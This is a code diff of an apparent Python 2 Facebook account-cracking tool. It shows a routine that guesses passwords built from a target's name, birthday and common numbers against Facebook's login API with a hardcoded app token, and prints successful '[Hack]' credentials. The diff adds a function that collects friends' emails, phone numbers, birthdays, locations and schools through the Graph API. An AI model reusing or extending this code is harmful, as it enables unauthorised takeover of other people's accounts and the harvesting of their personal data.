@@ -886,6 +886,9 @@ def menu():
 		a = json.loads(otw.text)
 		nama = a['name']
 		id = a['id']
+                ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
+                b = json.loads(ots.text)
+                sub = str(b['summary']['total_count'])
 	except KeyError:
 		os.system('clear')
 		print"\033[1;97mYour Account is on Checkpoint"
@@ -952,7 +955,7 @@ def menu():
         time.sleep(0.05)
         print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m16.\033[1;94m Start Cloning Testing       \033[1;94m▇▇"
         time.sleep(0.05)
-        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m17.\033[1;93m Find  Facebook  ID 👈       \033[1;92m▇▇"
+        print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m17.\033[1;93m ID Not Found  Problum solve \033[1;92m▇▇"
         time.sleep(0.05)
         print "\033[1;91m-•◈•-\033[1;93m> \033[1;92m18.\x1b[1;95m Get   ID From Friends       \033[1;95m▇▇"
         time.sleep(0.05)
@@ -1074,6 +1077,8 @@ def pilih():
 		nomor_hp()
         elif unikers =="24":
 		hpfrom_friends()
+        elif unikers =="25":
+		informasi()
 	elif unikers =="0":
 		jalan('Token Removed')
                 print logo22
@@ -1184,56 +1189,56 @@ def pilih_crack():
                         data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                         q = json.load(data)
                         if 'access_token' in q:
-                            print '\x1b[1;97m\x1b[1;92m[Hack]\x1b[1;97m ' + mobile_phone + ' | ' + pass1 + ' --> ' + b['name']
+                            print '\x1b[1;97m\x1b[1;92m[Hack]\x1b[1;97m ' + user + ' | ' + pass1 + ' --> ' + b['name']
                         else:
                             if 'www.facebook.com' in q['error_msg']:
-                                print '\x1b[1;97m\x1b[1;93m[CP]\x1b[1;97m ' + mobile_phone + ' | ' + pass1 + ' --> ' + b['name']
+                                print '\x1b[1;97m\x1b[1;93m[CP]\x1b[1;97m ' + user + ' | ' + pass1 + ' --> ' + b['name']
                             else:
                                     pass2 = b['firs_name'] + '12345'
                                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                     q = json.load(data)
                                     if 'access_token' in q:
-                                        print '\x1b[1;97m\x1b[1;92m[Hack]\x1b[1;97m ' + mobile_phone + ' | ' + pass2 + ' --> ' + b['name']
+                                        print '\x1b[1;97m\x1b[1;92m[Hack]\x1b[1;97m ' + user + ' | ' + pass2 + ' --> ' + b['name']
                                     else:
                                         if 'www.facebook.com' in q['error_msg']:
-                                            print '\x1b[1;97m\x1b[1;93m[CP]\x1b[1;97m ' + mobile_phone + ' | ' + pass2 + ' --> ' + ['name']
+                                            print '\x1b[1;97m\x1b[1;93m[CP]\x1b[1;97m ' + user + ' | ' + pass2 + ' --> ' + ['name']
                                         else:
                                                 pass3 = b['last_name'] + '123'
                                                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                 q = json.load(data)
                                                 if 'access_token' in q:
-                                                    print '\x1b[1;97m\x1b[1;92m[Hack]\x1b[1;97m ' + mobile_phone + ' | ' + pass3 + ' --> ' + b['name']
+                                                    print '\x1b[1;97m\x1b[1;92m[Hack]\x1b[1;97m ' + user + ' | ' + pass3 + ' --> ' + b['name']
                                                 else:
                                                     if 'www.facebook.com' in q['error_msg']:
-                                                        print '\x1b[1;97m\x1b[1;93m[CP]\x1b[1;97m ' + mobile_phone + ' | ' + pass3 + ' --> ' + b['name']
+                                                        print '\x1b[1;97m\x1b[1;93m[CP]\x1b[1;97m ' + user + ' | ' + pass3 + ' --> ' + b['name']
                                                     else:
 						            pass4 = b['last_name'] + '12345'
                                                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                             q = json.load(data)
                                                             if 'access_token' in q:
-                                                                print '\x1b[1;97m\x1b[1;92m[Hack]\x1b[1;97m ' + mobile_phone + ' | ' + pass4 + ' --> ' + b['name']
+                                                                print '\x1b[1;97m\x1b[1;92m[Hack]\x1b[1;97m ' + user + ' | ' + pass4 + ' --> ' + b['name']
                 				            else:
                                                                 if 'www.facebook.com' in q['error_msg']:
-                                                                    print '\x1b[1;97m\x1b[1;93m[CP]\x1b[1;97m ' + mobile_phone + ' | ' + pass4 + ' --> ' + b['name']
+                                                                    print '\x1b[1;97m\x1b[1;93m[CP]\x1b[1;97m ' + user + ' | ' + pass4 + ' --> ' + b['name']
                     					        else:
                                                                         birthday = b['birthday']
                                                                         pass5 = birthday.replace('/', '')
                                                                         data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                         q = json.load(data)
                                                                         if 'access_token' in q:
-                                                                            print '\x1b[1;97m\x1b[1;92m[Hack]\x1b[1;97m ' + mobile_phone + ' | ' + pass5 + ' --> ' + b['name']
+                                                                            print '\x1b[1;97m\x1b[1;92m[Hack]\x1b[1;97m ' + user + ' | ' + pass5 + ' --> ' + b['name']
                                                                         else:
                                                                             if 'www.facebook.com' in q['error_msg']:
-                                                                                print '\x1b[1;97m[\x1b[1;93m[CP]\x1b[1;97m ' + mobile_phone + ' | ' + pass5 + ' --> ' + b['name']
+                                                                                print '\x1b[1;97m[\x1b[1;93m[CP]\x1b[1;97m ' + user + ' | ' + pass5 + ' --> ' + b['name']
                                                                             else:
                                                                                     pass6 = ('786786')
                                                                                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                     q = json.load(data)
                                                                                     if 'access_token' in q:
-                                                                                        print '\x1b[1;97m\x1b[1;92m[Hack]\x1b[1;97m ' + mobile_phone + ' | ' + pass6 + ' --> ' + b['name']
+                                                                                        print '\x1b[1;97m\x1b[1;92m[Hack]\x1b[1;97m ' + user + ' | ' + pass6 + ' --> ' + b['name']
                                                                                     else:
                                                                                         if 'www.facebook.com' in q['error_msg']:
-                                                                                            print '\x1b[1;97m\x1b[1;93m[CP]\x1b[1;97m ' + mobile_phone + ' | ' + pass6 + ' --> ' + b['name']		
+                                                                                            print '\x1b[1;97m\x1b[1;93m[CP]\x1b[1;97m ' + user + ' | ' + pass6 + ' --> ' + b['name']		
 											                                       
 																	
 															
@@ -4630,6 +4635,61 @@ def hpfrom_friends():
         except requests.exceptions.ConnectionError:
             print '\x1b[1;95m[\xe2\x9c\x96] No connection'
             keluar()
+
+def informasi():
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	os.system('reset')
+	print logo16
+	aid = raw_input('\033[1;91m[+] \033[1;92mEnter ID\033[1;97m/\033[1;92mName\033[1;91m : \033[1;97m')
+	jalan('\033[1;91m[✺] \033[1;92mWait a minute \033[1;97m...')
+	r = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
+	cok = json.loads(r.text)
+	for i in cok['data']:
+		if aid in i['name'] or aid in i['id']:
+			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
+			z = json.loads(x.text)
+			print 42*"\033[1;97m♡"
+			try:
+				print '\033[1;91m[☆] \033[1;92mName\033[1;95m          : '+z['name']
+			except KeyError: print '\033[1;91m[?] \033[1;92mName\033[1;97m          : \033[1;91mNot found'
+			try:
+				print '\033[1;91m[☆] \033[1;92mID\033[1;97m            : '+z['id']
+			except KeyError: print '\033[1;91m[?] \033[1;92mID\033[1;92m            : \033[1;91mNot found'
+			try:
+				print '\033[1;91m[☆] \033[1;92mEmail\033[1;97m         : '+z['email']
+			except KeyError: print '\033[1;91m[?] \033[1;92mEmail\033[1;96m         : \033[1;91mNot found'
+			try:
+				print '\033[1;91m[☆] \033[1;92mTelephone\033[1;95m     : '+z['mobile_phone']
+			except KeyError: print '\033[1;91m[?] \033[1;92mTelephone\033[1;97m     : \033[1;91mNot found'
+			try:
+				print '\033[1;91m[☆] \033[1;92mLocation\033[1;97m      : '+z['location']['name']
+			except KeyError: print '\033[1;91m[?] \033[1;92mLocation\033[1;93m      : \033[1;91mNot found'
+			try:
+				print '\033[1;91m[☆] \033[1;92mDate of birth\033[1;91m : '+z['birthday']
+			except KeyError: print '\033[1;91m[?] \033[1;92mDate of birth\033[1;97m : \033[1;91mNot found'
+			try:
+				print '\033[1;91m[☆] \033[1;92mSchool\033[1;97m        : '
+				for q in z['education']:
+					try:
+						print '\033[1;91m                   ~ \033[1;92m'+q['school']['name']
+					except KeyError: print '\033[1;91m                   ~ \033[1;91mNot found'
+			except KeyError: pass
+			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+			menu()
+		else:
+			pass
+	else:
+		print"\033[1;91m[✖] User not found"
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		menu()
+		
           
 if __name__ == '__main__':
 	login()
